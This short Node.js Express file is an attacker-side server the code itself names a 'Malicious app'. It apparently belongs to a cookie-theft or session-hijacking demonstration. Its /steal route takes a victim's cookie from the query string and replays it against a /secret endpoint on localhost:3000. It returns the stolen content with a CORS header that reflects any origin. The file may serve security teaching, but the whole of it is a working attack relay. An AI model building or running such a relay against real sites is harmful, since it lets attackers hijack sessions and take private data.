var http = require('http');
var express = require('express');

var app = express();

app.get('/steal', function (req, res) {
    res.header('Access-Control-Allow-Origin', req.headers.origin);
    http.get({
        hostname: 'localhost',
        port: 3000,
        path: '/secret',
        headers: {
            Cookie: req.query.cookie
        }
    }, (response) => {
        var result = ''
        response.on('data', function (chunk) {
            result += chunk;
        });
        response.on('end', function () {
            res.send(result);
        });
    });
});

app.listen(3001, () => console.log(`Malicious app listening on port 3001!`));
